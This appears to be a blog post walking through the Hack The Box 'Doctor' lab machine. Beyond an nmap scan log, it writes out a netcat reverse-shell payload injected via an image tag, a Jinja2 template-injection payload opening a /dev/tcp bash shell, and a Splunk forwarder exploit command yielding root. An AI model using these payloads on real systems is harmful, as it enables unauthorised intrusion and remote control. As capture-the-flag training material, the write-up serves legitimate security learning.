<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Doctor | this is a tech blog</title>
  <meta name="author" content="dmeg">
  
  <meta name="description" content="The good doctor has some interesting higher ports open ."> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="Doctor"/>
  <meta property="og:site_name" content="this is a tech blog"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




  <!-- Matomo -->
<script type="text/javascript">
  var _paq = window._paq = window._paq || [];
  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="https://dmegtech.matomo.cloud/";
    _paq.push(['setTrackerUrl', u+'matomo.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.src='//cdn.matomo.cloud/dmegtech.matomo.cloud/matomo.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<!-- End Matomo Code -->


<meta name="generator" content="Hexo 5.2.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">this is a tech blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> Doctor</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><img src="/images/doc1.png" alt="doc"></p>
<p>The good doctor has some interesting higher ports open . </p>
<a id="more"></a>

<h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan :-"></a>nmap scan :-</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Tue Dec 22 12:12:06 2020 as: nmap -sV -sC -p- -o nmap.out -vvv 10.10.10.209</span><br><span class="line">Nmap scan report for 10.10.10.209 (10.10.10.209)</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.14s latency).</span><br><span class="line">Scanned at 2020-12-22 12:12:07 IST for 187s</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">Reason: 65532 no-responses</span><br><span class="line">PORT     STATE SERVICE  REASON         VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzyPiL1j9E6lyOgxqgosQ64mBwocTGo1DpclHHV5w28qPbnBJL32hfDNgUhAeaq7PL8zOQlKWprEnkfBNTUagvcX7deMgPsJ6zow&#x2F;K+WPqIUU5+LbQQ9TV6YeiWiPrO1W9dwwY0ZTXkkG6905kLDsKtCQZqt0VUGPiyWnZswXwWjbBo9KBF1dctUKv+MuyPLQ2qAr5X9LL21&#x2F;tWw0fLrIKLkCvdaMI9tVYXeFNZ1WyJSI4BfCB5OrNzpr4RN&#x2F;CaGSjSiBGn2zkegsk+zJpePSp9qfP&#x2F;fMwEyDQ1c8kei0g35Neaw5Mob1q3R0L6w8fTAnsYo9bYlnHNOl4Juon0QaOfzDry&#x2F;c4Hmwi43ypeUlv2zUdgGDUdemG79&#x2F;nHx&#x2F;rtLbBvdROI3UIjn6HOweHJs9VmwUjx509xZGoCwRcB0lIrDg9pWitWbg+qMTBvvYrLWgSovjpnilu8OcVituQHoXrrLMFVREY0SzF7K6SqbBO7QTrKODzrf1aH5gdgQNCE18&#x3D;</span><br><span class="line">|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHMC7+4t7zcs7cPg4JoOZiJF+MiORNU6ky66rLocXDEySgRgkeNf2uzjblvpnn2QYid7TCQUwQ&#x2F;6Bbz2yFM7jg&#x3D;</span><br><span class="line">|   256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEF0lJKhEknY94&#x2F;rK0D2et4K9Tp2E6CsYp0GxwdNJGhs</span><br><span class="line">80&#x2F;tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS HEAD GET</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089&#x2F;tcp open  ssl&#x2F;http syn-ack ttl 63 Splunkd httpd</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;</span><br><span class="line">|_http-server-header: Splunkd</span><br><span class="line">|_http-title: splunkd</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;SplunkServerDefaultCert&#x2F;organizationName&#x3D;SplunkUser</span><br><span class="line">| Issuer: commonName&#x3D;SplunkCommonCA&#x2F;organizationName&#x3D;Splunk&#x2F;stateOrProvinceName&#x3D;CA&#x2F;countryName&#x3D;US&#x2F;emailAddress&#x3D;support@splunk.com&#x2F;localityName&#x3D;San Francisco</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">| Not valid after:  2023-09-06T15:57:27</span><br><span class="line">| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787</span><br><span class="line">| SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIDMjCCAhoCCQC3IKogA4zEAzANBgkqhkiG9w0BAQsFADB&#x2F;MQswCQYDVQQGEwJV</span><br><span class="line">| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM</span><br><span class="line">| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW</span><br><span class="line">| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yMDA5MDYxNTU3MjdaFw0yMzA5MDYxNTU3</span><br><span class="line">| MjdaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK</span><br><span class="line">| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0JgJ</span><br><span class="line">| NKrC4SrGzEhhyluUIcBW+eD6y+4paEikip5bzO7Xz8+tVJmFBcDfZdkL3TIZFTCF</span><br><span class="line">| 95BMqL4If1SNZlFQxpMZB&#x2F;9PzCMm0HmhEK&#x2F;FlHfdrLwaeK71SWeO&#x2F;MMNtsAheIPA</span><br><span class="line">| pNByri9icp2S9u7wg89g9uHK4ION8uTJMxbmtCRT4jgRcenOZYghvsTEMLPhwlb2</span><br><span class="line">| M&#x2F;59WRopfyakIEl&#x2F;w&#x2F;zF1jCfnrT6XfZtTos6ueet6lhjd8g5WW9ZJIfmjYDaqHPg</span><br><span class="line">| Tg3yLCRjYhLk+2vLyrO23l5kk8H+H4JgIOCqhAw38hC0r+KETsuWCGIxl4rBBDQw</span><br><span class="line">| E5TvP75NsGW2O3JNDQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQBJjjx+KHFwYJei</span><br><span class="line">| lMJlmXBOEs7V1KiAjCenWd0Bz49Bkbik&#x2F;5Rcia9k44zhANE7pJWNN6gpGJBn7b7D</span><br><span class="line">| rliSOwvVoBICHtWFuQls8bRbMn5Kfdd9G7tGEkKGdvn3jOFkQFSQQQ56Uzh7Lezj</span><br><span class="line">| hjtQ1p1Sg2Vq3lJm70ziOlRa0i&#x2F;Lk7Ydc3xJ478cjB9nlb15jXmSdZcrCqgsAjBz</span><br><span class="line">| IIDPzC+f7hJYlnFau2OA5uWPX&#x2F;HIR7JfQsKXWCM6Tx0b9tZKgNNOr+DwyML4CH6o</span><br><span class="line">| qrryh7elUJojAaZ0wYNd5koGZzEH4ymAQoshgFyEgetm1BbzMbA3PfZkX1VR6AV+</span><br><span class="line">| guO5oa9R</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Tue Dec 22 12:15:14 2020 -- 1 IP address (1 host up) scanned in 187.39 seconds</span><br></pre></td></tr></table></figure>

<p>Checking the web server to find what is running there.<br><img src="/images/doc2.png" alt="web"><br>its a web page for a health institution . will run nikto scan on it </p>
<p>It didnt return anything interesting. A few issues were there but not exploitable any way<br><img src="/images/doc3.png" alt="nikto-doctor"></p>
<p>will iterate through the website more and take out any interesting information that i could find</p>
<p><img src="/images/doc4.png" alt="doctor-names"></p>
<p>this page has names of doctors which could come handy so will note it down</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Jade Guzman</span><br><span class="line">Hannah Ford</span><br><span class="line">James Wilson</span><br></pre></td></tr></table></figure>
<p>The contact pages says to mail on <code>doctors.htb</code> while we are on doctor.htb so will open that.</p>
<p><img src="/images/doc5.png" alt="contact"></p>
<p>the doctors.htb page has a <code>Doctor Secure Messaging</code> system installed on it. </p>
<p><img src="/images/doc6.png" alt="doctors"></p>
<p>will try registering an account in this</p>
<p><img src="/images/doc7.png" alt="account"></p>
<p>can create an account and post a message on the website . will try to put some bash scripts in it</p>
<p>payload :-</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://$LHOST/$(nc.traditional$IFS-e$IFS/bin/bash$IFS</span>&#x27;$<span class="attr">LHOST</span>&#x27;$<span class="attr">IFS</span>&#x27;<span class="attr">1234</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<p>using the image tag to get the reverse shell worked .</p>
<p>there is another way to foothold on this machine , atleast another that i stumbled across . Gobuster had given us a page called archive on the server<br><img src="/images/doc8.png" alt="archive"><br>any post that we create on the secure doctor messenger gets saved directly in the <code>&lt;title&gt;</code> tag making it vulnerable to <a target="_blank" rel="noopener" href="https://blog.nvisium.com/p255">server side template injection</a><br><img src="/images/doc9.png" alt="archive"><br>we can know the tools and tech used in this using wappalyzer plugin</p>
<p>so we can try the test for SSTI in jinja2 by doing a simple arithemetic operation and trying to escape it with <code>&#123;&#123;&#125;&#125;</code>. For all the SSTI test , refer <a href="https://dmeg.tech/2020/12/24/Finding%20and%20performing%20SSTI/">here</a>.<br>these are the values we gave<br><img src="/images/doc10.png" alt="ssti"><br>and this is the execution of the sum operation<br><img src="/images/doc11.png" alt="sum"><br>now that we know we can run operation on the template , will try to get a shell using this method<br>started listening using netcat on port 1235</p>
<p>payload:-</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[1].__subclasses__()[407](&#39;&#x2F;bin&#x2F;bash -c &quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;$LHOST&#x2F;1234 0&gt;&amp;1&quot;&#39;, shell&#x3D;True)&#125;&#125; </span><br></pre></td></tr></table></figure>
<p>and we drop a shell again as web on our netcat listen<br><img src="/images/doc12.png" alt="web-user"></p>
<p>Upon enumerating , got an apache log backup file which had a password for shaun and it worked</p>
<p><img src="/images/doc13.png" alt="shaun"></p>
<p>For root will use splunk.</p>
<blockquote>
<p>The Splunk Universal Forwarder Agent (UF) allows authenticated remote users to send single commands or scripts to the agents through the Splunk API. The UF agent doesn’t validate connections coming are coming from a valid Splunk Enterprise server, nor does the UF agent validate the code is signed or otherwise proven to be from the Splunk Enterprise server. This allows an attacker who gains access to the UF agent password to run arbitrary code on the server as SYSTEM or root, depending on the operating system.</p>
</blockquote>
<p>To exploit this vulnerability , will use the <a target="_blank" rel="noopener" href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2">PySplunkWhisperer</a>.  this is the payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host <span class="number">10.10</span><span class="number">.10</span><span class="number">.209</span> --port <span class="number">8089</span> --username shaun --password <span class="string">&quot;Guitar123&quot;</span> --payload <span class="string">&quot;nc.traditional -e/bin/bash &#x27;$LHOST&#x27; &#x27;1234&#x27;&quot;</span> --lhost $LHOST</span><br></pre></td></tr></table></figure>
<p>rooted</p>
<p><img src="/images/doc14.png" alt="root"></p>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/2020/12/25/Doctor/" class="leancloud-visitors view" data-flag-title="Doctor">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2022/04/24/SQLMAP/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2020/12/24/Finding and performing SSTI/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2020-12-25 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/HTB/">HTB<span>12</span></a></li> <li><a href="/tags/CTF/">CTF<span>12</span></a></li> <li><a href="/tags/OSCP/">OSCP<span>6</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 dmeg's Blog
  
        
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
